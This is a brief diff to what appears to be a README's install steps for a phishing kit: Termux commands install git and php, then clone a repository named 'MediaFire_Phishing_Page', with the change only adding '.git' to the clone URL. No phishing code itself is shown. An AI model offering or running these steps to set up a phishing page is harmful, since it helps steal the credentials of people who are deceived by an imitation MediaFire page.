@@ -10,7 +10,7 @@ pkg install git
 
 pkg install php
 
-git clone https://github.com/AdrianekTech/MediaFire_Phishing_Page
+git clone https://github.com/AdrianekTech/MediaFire_Phishing_Page.git
 
 cd MediaFire_Phishing_Page
 
